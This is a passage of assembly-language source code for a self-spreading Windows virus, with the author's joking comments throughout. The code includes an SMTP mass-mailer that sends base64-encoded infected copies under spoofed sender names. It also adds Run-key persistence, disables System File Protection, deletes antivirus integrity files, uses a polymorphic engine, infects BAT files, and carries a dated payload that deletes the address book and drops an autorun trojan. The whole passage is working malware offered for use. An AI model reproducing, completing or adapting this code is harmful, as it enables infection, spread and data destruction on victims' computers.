           ret

   GetCRC32:
   ; input:
   ;       ESI = Pointer to ASCIIZ string
   ; output:
   ;       EAX = CRC32 of such string

           mov     edi,esi                         ; First we need to get the
           xor     al,al                           ; CRC32 of the e-mail we're
   _next:  scasb                                   ; sending the "gift" ;)
           jnz     _next
           sub     edi,esi
           call    CRC32
           ret

   ; The important thing of all this shit, the threaded SMTP client

   SendMail:
   ; input:
   ;       Nothing.
   ; output:
   ;       Nothing.

           if      debug
           int     3
           endif

       xor     edx,edx
           call    $+9
           dd      ?                               ; lpThreadId
       push    edx                             ; dwCreationFlags
           push    edx                             ; lpParameter
           lea     eax,[ebp+AwaitConnection]
           push    eax                             ; lpStartAddress
       push    edx                             ; dwStackSize
       push    edx                             ; lpThreadAttributes
           apicall CreateThread
           mov     dword ptr [ebp+ThreadHandle],eax
       xchg    eax, ecx                        ; Error?
           jecxz   ErrorCreatingMailThread         ; Damn...

           push    ecx
           push    -2
           push    ecx
           apicall SetThreadPriority               ; Lowest priority
           pop     ecx

           push    -1                              ; Push -1
           push    ecx                             ; Push mail thread handle
           apicall WaitForSingleObject
   ErrorCreatingMailThread:
           ret

   ; This thread will await until we're connected to the internet with a low
   ; priority, thus avoiding to suck so much system resources.

   AwaitConnection:
           call    GetDeltaOffset
           db      0FFh

           push    00h
           call    $+9
           dd      ?
           apicall InternetGetConnectedState       ; Thanx Asmod! :)
           dec     eax
           jnz     AwaitConnection

           push    15
           push    dword ptr [ebp+ThreadHandle]
           apicall SetThreadPriority

   ; And now create the real pain in the ass, the SMTP client thread :P

       xor     edx,edx
           call    $+9
           dd      ?                               ; lpThreadId
       push    edx                             ; dwCreationFlags
           push    edx                             ; lpParameter
           lea     eax,[ebp+SMTPClient]
           push    eax                             ; lpStartAddress
       push    edx                             ; dwStackSize
       push    edx                             ; lpThreadAttributes
           apicall CreateThread
       xchg    eax, ecx                        ; Error?
           jecxz   ErrorCreatingClientThread       ; Damn...

           push    ecx

           push    15
           push    ecx
           apicall SetThreadPriority               ; Suck resources! Suck! Suck!

           pop     ecx

           push    0
           push    ecx

           push    180000d                         ; Wait 2 minute
           push    ecx                             ; Push mail thread handle
           apicall WaitForSingleObject

           apicall TerminateThread                 ; Terminate thread then :(

   ErrorCreatingClientThread:
           push    00h
           apicall ExitThread

   ; This is the client code. Enjoy! :P

   SMTPClient:
           call    GetDeltaOffset
           db      0BBh                            ; heh :]

           lea     eax,[ebp+wsad]                  ; Init wsock functions
           push    eax
           push    101h
           apicall WSAStartup
           or      eax,eax
           jnz     error_smtp

           cmp     word ptr [ebp+wsad.mVersion],101h ; Check wsock version (1.1)
           jnz     close_socks

           push    00h                             ; Protocol (none)
           push    01h                             ; Type of socket (stream)
           push    02h                             ; Family (Internet)
           apicall socket
           mov     dword ptr [ebp+SocketHandle],eax
           inc     eax                             ; Check for errors
           jz      close_socks

           mov     word ptr [ebp+saddr.sin_family],02h

           push    25d                             ; SMTP port
           apicall htons                           ; Convert to network byte order

           mov     word ptr [ebp+saddr.sin_port],ax

           lea     edi,[ebp+SMTPName]              ; Push name of SMTP server
           push    edi
           apicall gethostbyname
           or      eax,eax
           jz      kill_socks

           mov     esi,dword ptr [eax.h_ip]
           lodsd
           mov     dword ptr [ebp+saddr.sin_addr],eax

   ; Now that SOCKADDR structure is built, let's connect

           push    size SOCKADDR
           lea     eax,[ebp+saddr]
           push    eax
           push    dword ptr [ebp+SocketHandle]
           apicall connect
           inc     eax
           jz      kill_socks

   ; This is the loop for send shit :]

   ;       int     3

           lea     esi,[ebp+szToSend]              ; The megalewp! :)
           push    nToSend
           pop     ecx

   f0rking_muthafucka:
           push    ecx
           lodsd
           add     eax,ebp
           xchg    eax,esi
           call    getstringsize
           call    _send

           call    _recv                           ; Receive shit :)

           cmp     eax," 052"                      ; Check for possible good
           jz      kill_socks                      ; return codes :)
           cmp     eax," 453"
           jz      kill_socks
           cmp     eax," 022"
           jz      kill_socks

           pop     ecx
           loop    f0rking_muthafucka

           lea     esi,[ebp+message_body1]         ; We send e-mail body
           mov     ecx,message_size1
           call    _send

           mov     esi,dword ptr [ebp+MimePtr]
           mov     ecx,dword ptr [ebp+MimeSize]
           call    _send

           lea     esi,[ebp+message_body2]
           mov     ecx,message_size2
           call    _send

           lea     esi,[ebp+szEndOfMail]           ; Now we flush all, and
           call    getstringsize                   ; server sends the e-mail
           call    _send

           lea     esi,[ebp+szQuit]
           call    getstringsize
           call    _send

   ; All the job is done, log off! :D

   kill_socks:
           push    dword ptr [ebp+SocketHandle]
           apicall closesocket

   close_socks:
           apicall WSACleanup

   error_smtp:
           push    00h
           apicall ExitThread

   ; This will retrieve a name of a SMTP server, which we'll use to send e-mails
   ; But before we'll build a base64 encoded attachment that carry a copy of the
   ; virus (our 'gift') :P

   SMTPInitClient:
   ; input:
   ;       Nothing.
   ; output:
   ;       ESI = Pointer to a SMTP server name

           push    dword ptr [ebp+MimePtr]         ; Liberate mem (if allocated)
           apicall GlobalFree

   ; Now we're gonna put in some temporally allocated memory an infected file :)

           call    ReleaseDropper

           push    00h                             ; Create the dropper
           push    80h
           push    03h
           push    00h
           push    01h
           push    80000000h
           lea     edi,[ebp+TemporalFile]
           push    edi
           apicall CreateFileA

           mov     esi,eax

           push    eax

           push    00h
           push    eax
           apicall GetFileSize

           mov     dword ptr [ebp+enc_size],eax

           xchg    edi,eax

           push    edi
           add     dword ptr [esp],1000            ; security :)
           push    00h
           apicall GlobalAlloc
           mov     dword ptr [ebp+temp_buffer],eax

       push    00h
       lea     ebx,[ebp+NumBytesRead]
       push    ebx
           push    edi
           push    eax
           push    esi
           apicall ReadFile

           apicall CloseHandle

   ; We setup it to be sent - with base64 algorithm

           push    80000d                          ; Make some big buffer
           push    00h
           apicall GlobalAlloc
           mov     dword ptr [ebp+MimePtr],eax

           mov     eax,12345678h                   ; EAX = size of data to encode
   enc_size =      $-4

           push    3
           pop     ecx

           xor     edx,edx                         ; Align, sucker
           push    eax
           div     ecx
           pop     eax
           sub     ecx,edx
           add     eax,ecx
           xchg    eax,ecx

           mov     edx,dword ptr [ebp+MimePtr]
           mov     eax,dword ptr [ebp+temp_buffer]
           call    encodeBase64
           mov     dword ptr [ebp+MimeSize],ecx

           push    dword ptr [ebp+temp_buffer]
           apicall GlobalFree

           call    KillDropper

   ; Spoof a bit the e-mail :)

           lea     edi,[ebp+szNameFrom]
           lea     esi,[ebp+names]
           call    r_range,8
           xchg    eax,ecx
           call    SetNewName

   ; Now search for SMTP client's name :)

           lea     edi,[ebp+RegHandle]

           push    edi
           push    01h                             ; KEY_QUERY_VALUE
           push    00h
           pushs   "Software\Microsoft\Internet Account Manager",0
           push    80000001h                       ; HKEY_CURRENT_USER
           apicall RegOpenKeyExA

           or      eax,eax
           jnz     HardcodeSMTP

           call    x_1
           dd      00000009h                       ; Copy 9 chars
   x_1:    lea     eax,[ebp+AccountIdx]            ; Where put the new info
           push    eax
           push    00h
           push    00h
           pushs   "Default Mail Account",0
           push    dword ptr [ebp+RegHandle]
           apicall RegQueryValueExA

           or      eax,eax
           jnz     HardcodeSMTP

           push    dword ptr [ebp+RegHandle]
           call    RegCloseKey

           push    edi
           push    01h                             ; KEY_QUERY_VALUE
           push    00h
           call    x_2
           db      "Software\Microsoft\Internet Account Manager\Accounts\"
   AccountIdx db   "00000000",0
   x_2:    push    80000001h                       ; HKEY_CURRENT_USER
           apicall RegOpenKeyExA

           or      eax,eax
           jnz     HardcodeSMTP

           call    x_3
           dd      00000030d                       ; Copy 30 chars
   x_3:    lea     edi,[ebp+SMTPName]              ; Where put the new value
           push    edi
           push    00h
           push    00h
           pushs   "SMTP Server",0
           push    dword ptr [ebp+RegHandle]
           apicall RegQueryValueExA

           or      eax,eax
           jnz     HardcodeSMTP

           push    dword ptr [ebp+RegHandle]
           call    RegCloseKey
           mov     esi,edi
           ret
   HardcodeSMTP:
           call    r_range,02h                     ; Greetz to vecna for thiz
           mov     esi,dword ptr [ebp+SMTPServers+eax*4]
           add     esi,ebp
           ret

   ; This procedure will generate a random name for the "from:" field of e-mail,
   ; using "usual" american names. It can be trustable ;P
   ;
   ; The full name can be a combination of the following ones:
   ;
   ; NAMES                 SURNAMES
   ;
   ; William               Smith
   ; Brian                 O'Leary
   ; Steve                 Anderson
   ; Matt                  Herrera
   ; Thomas                Burton
   ; James                 Case
   ; Jeniffer              Lee
   ; Lisa                  Grissom

   SetNewName:
   ; input:
   ;       ECX = Place, in names structure, of the name we wanna put
   ;       ESI = Name table structure
   ;       EDI = Where put it
   ; output:
   ;       Nothing.

           lodsb
           test    al,al
           jnz     SetNewName
           loop    SetNewName
   cp_name:lodsb
           stosb
           test    al,al
           jnz     cp_name
           dec     edi
           ret

   ; Mwaha! I don't like the idea of coding this shit myself, so rip is useful.
   ; I have author permission :) I've optimized it a bit, also.

   encodeBase64:
   ; input:
   ;       EAX = Address of data to encode
   ;       EDX = Address to put encoded data
   ;       ECX = Size of data to encode
   ; output:
   ;       ECX = size of encoded data
   ;
           xor     esi,esi ; encodeBase64 by Bumblebee. All rights reserved ;)
           call    over_enc_table
           db      "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
           db      "abcdefghijklmnopqrstuvwxyz"
           db      "0123456789+/"
   over_enc_table:
           pop     edi
           push    ebp
           xor     ebp,ebp
   baseLoop:
           movzx   ebx,byte ptr [eax]
           shr     bl,2
           and     bl,00111111b
           mov     bh,byte ptr [edi+ebx]
           mov     byte ptr [edx+esi],bh
           inc     esi

           mov     bx,word ptr [eax]
           xchg    bl,bh
           shr     bx,4
           mov     bh,0
           and     bl,00111111b
           mov     bh,byte ptr [edi+ebx]
           mov     byte ptr [edx+esi],bh
           inc     esi

           inc     eax
           mov     bx,word ptr [eax]
           xchg    bl,bh
           shr     bx,6
           xor     bh,bh
           and     bl,00111111b
           mov     bh,byte ptr [edi+ebx]
           mov     byte ptr [edx+esi],bh
           inc     esi

           inc     eax
           xor     ebx,ebx
           movzx   ebx,byte ptr [eax]
           and     bl,00111111b
           mov     bh,byte ptr [edi+ebx]
           mov     byte ptr [edx+esi],bh
           inc     esi
           inc     eax

           inc     ebp
           cmp     ebp,24
           jna     DontAddEndOfLine

           xor     ebp,ebp                         ; add a new line
           mov     word ptr [edx+esi],0A0Dh
           inc     esi
           inc     esi
           test    al,00h                          ; Optimized (overlap rlz!)
           org     $-1
   DontAddEndOfLine:
           inc     ebp
           sub     ecx,3
           or      ecx,ecx
           jne     baseLoop

           mov     ecx,esi
           add     edx,esi
           pop     ebp
           ret

   getstringsize:
   ; input:
   ;       ESI = Pointer to string
   ; output:
   ;       ECX = Size of string, without counting NULL terminator

           mov     edi,esi
           xor     al,al
           scasb
           jnz     $-1
           sub     edi,esi
           mov     ecx,edi
           dec     ecx
           ret

   _send:
   ; input:
   ;     ECX = Size of data to send
   ;     ESI = Pointer to the data to send
   ; output:
   ;     EAX = If successful, the number of bytes sent, otherwise, -1.

           push    00h
           push    ecx                             ; Bytes to send
           push    esi                             ; What send
           push    dword ptr [ebp+SocketHandle]    ; What socket
           call    send
           ret

   _recv:
   ; input:
   ;      Nothing.
   ; output:
   ;      EAX = If successful, the 4 first bytes received, otherwise, 0.

           push    00h
           push    04h                             ; Bytes to receive (a dword)
           lea     eax,[ebp+where_recv]
           push    eax                             ; Where receive
           push    dword ptr [ebp+SocketHandle]    ; What socket
           call    recv
           inc     eax                             ; Test if error (-1)
           jz      recv_err
           cmp     eax,5
           jnz     recv_err
   get1mo:
           push    00h
           push    01h                             ; Bytes to receive (a byte)
           call    $+6
   mugrix  db      00h                             ; Received here :)
           push    dword ptr [ebp+SocketHandle]    ; What socket
           call    recv

           cmp     byte ptr [ebp+mugrix],0Ah       ; Till find this
           jnz     get1mo

           db      0B8h                            ; EAX = The dword received
   where_recv dd  ?
           ret
   recv_err:
           xor     eax,eax
           ret

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % Windows boot-up handling (Spawning) subroutines                         %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   ; This routine will unpack the PE dropper and will infect it. It's needed for
   ; Windows boot-up handling, archive infection, and BAT infection. The dropper
   ; is packed (not really compressed at all) by a simple engine i did based in
   ; the repeatition of zeroes. Sorta simple, you know. But for PE files, it
   ; makes it to occupy much less than if it were not compressed. So i called it
   ; LSCE (Little Shitty Compression Engine). You won't see it released as an
   ; independent package coz it doesn't have the enough quality :)

   ReleaseDropper:
           push    8192d                           ; Alloc some memory more
           push    00h
           apicall GlobalAlloc
           mov     dword ptr [ebp+GlobalAllocHnd],eax

           call    over_dr0p
           include dropper.inc
   over_dr0p:
           pop     esi
           mov     ecx,sdr0p
           xchg    eax,edi

           call    LSCE_UnPack

           push    00h                             ; Create the dropper
           push    80h
           push    02h
           push    00h
           push    01h
           push    40000000h
           lea     edi,[ebp+TemporalFile]
           push    edi
           apicall CreateFileA

       push    eax                             ; Write it, sucka!

           push    00h
           lea     ebx,[ebp+iobytes]
       push    ebx
           push    2000h
           push    dword ptr [ebp+GlobalAllocHnd]
       push    eax
           apicall WriteFile

           apicall CloseHandle

           push    dword ptr [ebp+GlobalAllocHnd]
           apicall GlobalFree

           push    dword ptr [ebp+ModBase]
           push    dword ptr [ebp+OldEIP]

           lea     edi,[ebp+TemporalFile]          ; Infect the dr0pped file
           call    InfectPE

           pop     dword ptr [ebp+OldEIP]
           pop     dword ptr [ebp+ModBase]

           push    00h                             ; Create the dropper
           push    80h
           push    03h
           push    00h
           push    01h
           push    0C0000000h
           lea     edi,[ebp+TemporalFile]
           push    edi
           apicall CreateFileA

           push    eax

           push    00h
           push    eax
           apicall GetFileSize
           mov     dword ptr [ebp+DropperSize],eax

           apicall CloseHandle
           ret

   ; This procedure will delete the temporal infected file.

   KillDropper:
           lea     edi,[ebp+TemporalFile]          ; Hide our steps :)
           push    edi
           apicall DeleteFileA
           ret

   ; This is one of the main procedures of the virus... It will set a new key
   ; into 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run', with the path
   ; of an infected file. This will allow us to run everytime windows is initi-
   ; alized.

   BuildWinBootVirusCopy:
           lea     edi,[ebp+temp_dir]              ; Setup some variables
           push    MAX_PATH
           push    edi
           apicall GetSystemDirectoryA             ; Get System Dir (1st time)

           call    twilight_time
   trojan  db      "\REVEROF.EXE",0                ; Copy to this file in SYS dir
   twilight_time:
           push    edi
           apicall lstrcat

           lea     esi,[ebp+TemporalFile]          ; Copy temporal file there
           push    00h
           push    edi
           push    esi
           apicall CopyFileA

           if      winboot

           lea     eax,[ebp+Disposition]           ; Put an infected virus copy
           push    eax                             ; at the windows boot-up ;)
       lea     eax,[ebp+RegHandle]
       push    eax
           cdq
           push    edx
       push    000F003Fh
           push    edx
           push    edx
           push    edx

   ; Thanx to the mag PCMANIA for showing this reg key as a trick for W95 ;)

           pushs   "Software\Microsoft\Windows\CurrentVersion\Run"
           push    80000002h
           apicall RegCreateKeyExA

           lea     edi,[ebp+temp_dir]

           push    edi
           xor     eax,eax
           scasb
           jnz     $-1
           sub     edi,[esp]
           xchg    edi,eax                         ; EAX = Size of the string
           pop     edi

           push    eax
           push    edi
       push    01h
       push    00h
           lea     edi,[ebp+szTtl_]
           push    edi
       push    dword ptr [ebp+RegHandle]
           apicall RegSetValueExA

           endif

           if      debug
           else
           lea     eax,[ebp+temp_dir]              ; Set it R/O, hidden and system
           push    80h or 04h or 02h or 01h        ; Untouchable file :)
           push    eax
           apicall SetFileAttributesA
           endif
           ret

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % Deactivate System File Protection (SFP)                                 %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   ; Thanx to LifeWire for publishing in his web (www.lifewire.org) this trick

   KillSFC:
           lea     eax,[ebp+Disposition]           ; Deactivate SFP in Win2k
           push    eax
           lea     eax,[ebp+RegHandle]
       push    eax
           push    00h
       push    000F003Fh
           push    00h
           push    00h
           push    00h
           pushs   "Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
           push    80000002h
           apicall RegCreateKeyExA

           push    04h                             ; Put 4 bytes
           call    o_1
           dd      0FFFFFFD9h                      ; With this value we kill SFP
   o_1:    push    01h
       push    00h
           pushs   "SFCDisable"
       push    dword ptr [ebp+RegHandle]
           apicall RegSetValueExA
           ret

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % New-UVE engine; make the virus incurable at all :)                      %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   incurability    proc
   ; input:
   ;       ESI = Ptr to host's EIP
   ; output:
   ;       Right things in right variables :)

           pushad

           lea     edi,[ebp+incurable]             ; Ptr to our mixed block
           mov     byte ptr [ebp+UsedReg],04h      ; Reset to original values
           xor     ebx,ebx

           push    07h                             ; 7 instructions to build
           pop     edx

           lodsb                                   ; Get 1st opcode of EIP

           cmp     al,0B8h                         ; Now check if it's a mov
           jb      DoItAllRandomly                 ; reg32,imm32
           cmp     al,0BFh
           ja      DoItAllRandomly
           cmp     al,0BCh                         ; We don't like MOV ESP,IMM32
           jz      DoItAllRandomly

           sub     al,0B8h                         ; Get the register where move
           mov     byte ptr [ebp+UsedReg],al       ; Store it
           lodsd
           mov     dword ptr [ebp+Immediate32],eax ; Save the immediate

           add     dword ptr [ebp+OldEIP],05h      ; Fix the entrypoint thing

           and     dword ptr [esi-4],00h           ; Nulify original instruction
           mov     byte ptr [esi-5],00h

   DoItAllRandomly:
           call    r_range,08h
           cmp     al,04h                          ; We don't like ESP
           jz      DoItAllRandomly

           bt      bx,ax                           ; Check if bit was set
           jc      DoItAllRandomly

           bts     bx,ax                           ; Set the written bits

           cmp     al,04h                          ; This might be patched
   UsedReg =       $-1
           jnz     ItIsNotInteresting

           push    eax

           add     al,0B8h
           stosb                                   ; Put the legit MOV
           mov     eax,12345678h                   ; Put in EAX the saved imm32
   Immediate32 =   $-4
           stosd                                   ; Put it also

           pop     eax
           jmp     DontLikePrepotentPeople

   ItIsNotInteresting:
           add     al,0B8h                         ; Build a fake MOV
           stosb
           call    random
           stosd
   DontLikePrepotentPeople:
           dec     edx                             ; Decrease the counter
           jnz     DoItAllRandomly                 ; If we reach 0, leave this
   inc_return:
           popad                                   ; Hey ho! let's go ;)
           ret
   incurability    endp

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % Miscellaneous subroutines                                               %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   GetDeltaOffset:
   ; input:
   ;       Nothing.
   ; output:
   ;       EBP = Delta Offset

           pop     eax

           call    DeltaShit
   DeltaShit:
           pop     ebp
           sub     ebp,offset DeltaShit
           inc     eax
           push    eax
           ret

   CheckImageBase:
   ; input:
   ;       ESI - Address inside module
   ;       ECX - Limit
   ; output:
   ;       ESI - module address

           and     esi,0FFFF0000h
           cmp     word ptr [esi],"ZM"
           jz      ItWasKewlEnough
   NotCoolAddress:
           sub     esi,00010000h
           loop    CheckImageBase
   ItWasKewlEnough:
           ret

   CRC32           proc
   ; input:
   ;       ESI - Pointer to the code to process
   ;       EDI - Size of such code
   ; output:
   ;       EAX - CRC32 of that code

       cld
           pushad
       xor     ecx,ecx                         ; Optimized by me - 2 bytes
       dec     ecx                             ; less
       mov     edx,ecx
   NextByteCRC:
       xor     eax,eax
       xor     ebx,ebx
       lodsb
       xor     al,cl
       mov     cl,ch
       mov     ch,dl
       mov     dl,dh
       mov     dh,8
   NextBitCRC:
       shr     bx,1
       rcr     ax,1
       jnc     NoCRC
       xor     ax,08320h
       xor     bx,0EDB8h
   NoCRC:  dec     dh
       jnz     NextBitCRC
       xor     ecx,eax
       xor     edx,ebx
       dec     edi                             ; Another fool byte less
       jnz     NextByteCRC
       not     edx
       not     ecx
           xchg    eax,edx                         ; Another byte less
       rol     eax,16
       mov     ax,cx
           mov     [esp.PUSHAD_EAX],eax
           popad
       ret
   CRC32           endp

   LSCE_UnPack     proc
   ; input:
   ;       ESI - Data to expand
   ;       EDI - Where expand
   ;       ECX - Size of data to expand
   ; output:
   ;       Nothing.

           lodsb                                   ; 1 byte
           test    al,al                           ; 2 bytes
           jnz     store_byte                      ; 2 bytes
           dec     ecx                             ; 1 byte
           dec     ecx                             ; 1 byte
           lodsw                                   ; 2 bytes
           cwde                                    ; 1 byte
       push    ecx                             ; 1 byte
           xor     ecx,ecx                         ; 2 bytes
       xchg    eax,ecx                         ; 1 byte
       rep     stosb                           ; 2 bytes
       pop     ecx                             ; 1 byte
       test    al,00h                          ; 1 byte
       org     $-1
   store_byte:
       stosb                                   ; 1 byte
           loop    LSCE_UnPack                     ; 2 bytes
           ret
   LSCE_UnPack     endp

   random          proc                            ; Thanx MDriller + GriYo! ;)
   ; input:
   ;       Nothing
   ; output:
   ;       EAX = Pseudo-random number

       push    ecx
       mov     eax,dword ptr [ebp+rnd_seed1]
       dec     dword ptr [ebp+rnd_seed1]
       xor     eax,dword ptr [ebp+rnd_seed2]
       mov     ecx,eax
       rol     dword ptr [ebp+rnd_seed1],cl
       add     dword ptr [ebp+rnd_seed2],eax
       adc     eax,dword ptr [ebp+rnd_seed2]
       add     eax,ecx
       ror     eax,cl
       not     eax
           imul    eax,41C64E6Dh
           add     eax,00003039h
       sub     eax,3
       xor     dword ptr [ebp+rnd_seed2],eax
       xor     eax,dword ptr [ebp+rnd_seed3]
       rol     dword ptr [ebp+rnd_seed3],1
       sub     dword ptr [ebp+rnd_seed3],ecx
       sbb     dword ptr [ebp+rnd_seed3],4
       inc     dword ptr [ebp+rnd_seed2]
       pop     ecx
           sahf
       ret
   random          endp

   r_range         proc
   ; input:
   ;       TOS = Number of possible random numbers
   ; output:
   ;       EAX = Number between 0 and (EAX-1)

           mov     eax,[esp+04h]
           push    ecx
           push    edx
           xchg    eax,ecx
           call    random
           xor     edx,edx
           div     ecx
           xchg    eax,edx
           pop     edx
           pop     ecx
           ret     4
   r_range endp

   f_random        proc
   ; input:
   ;       Nothing.
   ; output:
   ;       Flags are random.

           push    eax
           call    random
           pop     eax
           ret
   f_random        endp

   ; Well, it's a feature, not a subroutine... ;)

   DeleteIntegrityFiles:
       lea     edi,[ebp+Files2Kill]            ; Load pointer to first file

   killem: push    80h
           push    edi
           apicall SetFileAttributesA

           push    edi                             ; Push file to erase
           apicall DeleteFileA                     ; Delete it!

           xor     al,al
           scasb
           jnz     $-1

           cmp     byte ptr [edi],0BBh
           jnz     killem
           ret

   GenerateName:
   ; input:
   ;       EDI = Pointer to where we want the random name
   ; output:
   ;       Nothing.

           push    06h                             ; Generate in [EDI] a 6 char
       pop     ecx                             ; name
   GenNameX:
           call    random                          ; Generate letter between
       and     al,25d                          ; A and Z :]
       add     al,41h
       stosb
           loop    GenNameX
       ret

   HexWrite16:
   ; input:
   ;       EDI = Where store converted number
   ;       EAX = Number to convert
   ; output:
   ;       Nothing.

           push    eax
           xchg    al,ah
           call    HexWrite8
           pop     eax

   HexWrite8:
           mov     ah,al                           ; Mmm... routines stolen from
           and     al,0Fh                          ; borland...cut'n'paste rocks!
           shr     ah,4                            ; ;)
           or      ax,3030h                        ; Blargh, they are shitty
           xchg    al,ah                           ; optimized, even locally. I
           cmp     ah,39h                          ; Fixed a bit that local opt.
           ja      @@4                             ; but it's still unoptimized
   @@1:    cmp     al,39h                          ; structurally... AAAGH! :)
           ja      @@3
   @@2:    stosw
           ret
   @@3:    add     al,("A"-10)-30h
           jmp     @@2
   @@4:    add     ah,("A"-10)-30h
           jmp     @@1

   ToUpperCase:
   ; input:
   ;       ESI = Pointer to the string to make upcase
   ; output:
   ;       Nothing.

           pushad
           mov     edi,esi
   ucase_l00p1:
           lodsb
           test    al,al
           jz      ucase_d0ne1
           cmp     al,"a"
           jb      store_char1
           cmp     al,"z"
           ja      store_char1
           xor     al,20h
   store_char1:
           stosb
           jmp     ucase_l00p1
   ucase_d0ne1:
           popad
           ret

   ; Prizzy's routine

   __movsd_back:
   ; input:
   ;       ECX = Bytes to move
   ;       ESI = Source
   ;       EDI = Destination
   ; output:
   ;       Nothing.

           add     esi,ecx
           dec     esi
           add     edi,ecx
           dec     edi
           std
           shr     ecx,01h
           jnc     __mb_nomovsb
           movsb
   __mb_nomovsb:
           jz      __mb_finish
           dec     esi
           dec     edi
           shr     ecx,01h
           jnc     __mb_nomovsw
           movsw
           jz      __mb_finish
   __mb_nomovsw:
           dec     esi
           dec     esi
           dec     edi
           dec     edi
           rep     movsd
   __mb_finish:
           cld
           ret

   ; ooopz! :P

   annoy@@1:
           pop     eax
           inc     eax
           push    eax
           ret

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % Here goes the poly engine                                               %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

           include mmxe102.inc

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % Virus payload                                                           %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   payload:
   ; We're gonna see if it's our day-payload :)

           call    overst
   Year    dw      ?
   Month   dw      ?
   DOW     dw      ?
   Day     dw      ?
   Hour    dw      ?
   Minute  dw      ?
   Second  dw      ?
   Msec    dw      ?
   overst: apicall GetSystemTime

           cmp     word ptr [ebp+Month],pay_month
           jnz     tejodo

           cmp     word ptr [ebp+Day],pay_date
           jnz     tejodo

   ; Well, before all... as this happens once a year, we delete the address book
   ; so we are able to reinfect all the suckers via e-mail :)

           lea     edi,[ebp+AddBook]

           push    80h                             ; Wipe file special attributes
           push    edi
           apicall SetFileAttributesA

           push    edi                             ; And delete it
           apicall DeleteFileA

   ; First, lets drop the "trojan"

           push    8192d                           ; Alloc some memory more
           push    00h
           apicall GlobalAlloc
           mov     dword ptr [ebp+GlobalAllocHnd],eax

           call    over_dr0p1
           include dropper1.inc                    ; Dr0pper f0r payl0ad X-D
   over_dr0p1:
           pop     esi
           mov     ecx,sdr0p1
           xchg    eax,edi

           call    LSCE_UnPack

           push    00h                             ; Create the dropper
           push    80h
           push    02h                             ; CREATE_ALWAYS
           push    00h
           push    01h
           push    40000000h                       ; GENERIC_WRITE
           lea     edi,[ebp+PayTrojan]
           push    edi
           apicall CreateFileA

       push    eax                             ; Write it, sucka!

           push    00h
           lea     ebx,[ebp+iobytes]
       push    ebx
           push    2000h                           ; 8K file
           push    dword ptr [ebp+GlobalAllocHnd]
       push    eax
           apicall WriteFile

           apicall CloseHandle

           push    dword ptr [ebp+GlobalAllocHnd]
           apicall GlobalFree

           lea     eax,[ebp+PayTrojan]             ; Set it R/O and hidden
           push    80h or 02h or 01h
           push    eax
           apicall SetFileAttributesA

   ; Ok, "trojan" dropped. Now put the new AUTORUN.INF file.

           xor     eax,eax                         ; new file
       push    eax
       push    eax
           push    02h
       push    eax
       inc     eax
       push    eax
       push    40000000h
           call    orion
   aruninf db      "AUTORUN.INF",0                 ; Oh, how cool i am ;)
   orion:  apicall CreateFileA

           mov     dword ptr [ebp+TempHandle],eax

           push    00h                             ; Overwrite with our file :)
       lea     ebx,[ebp+iobytes]
       push    ebx
           push    (sanitarium-kaka1)
           call    sanitarium                      ; Welcome home!
   kaka1:  db      "[autorun]",10                  ; This is our new and cool
           db      "icon=F0R3V3R.EXE",10           ; autorun trojan ;)
           db      "open="
   PayTrojan db    "F0R3V3R.EXE",0
   sanitarium:
           push    eax
           apicall WriteFile

           push    12345678h
   TempHandle equ  $-4
           apicall CloseHandle
   tejodo:
           ret

   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   ; % BAT Infection datas                                                     %
   ; %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

   BAT_part1       label   byte
                   db      ":P",13,10              ; Infection mark
                   db      "@echo off",13,10
                   db      "goto dr0p_4ever",13,10
                   db      "N C:\FRAGILE.SYS",13,10
   sBAT_part1      =       ($-offset BAT_part1)

   BAT_part2       label   byte
                   db      "RCX",13,10
   src_bytes       db      "0000",13,10
                   db      "W",13,10
                   db      "Q",13,10
                   db      ":dr0p_4ever",13,10
                   db      "debug <%0 >nul",13,10
                   db      "copy C:\FRAGILE.SYS C:\FRAGILE.EXE >nul",13,10
                   db      "C:\FRAGILE.EXE >nul",13,10
                   db      "attrib +r +s +h C:\FRAGILE.EXE >nul",13,10
                   db      "del C:\FRAGILE.SYS >nul",13,10
                   db      "echo on",13,10
   sBAT_part2      =       ($-offset BAT_part2)

   ; We don't put a 'del C:\FRAGILE.EXE' because it would raise an error...
   ; -> 'Access denied' <-                   (because multitask of Windows.)
   ; We'll delete it later, when the virus will be executed :)

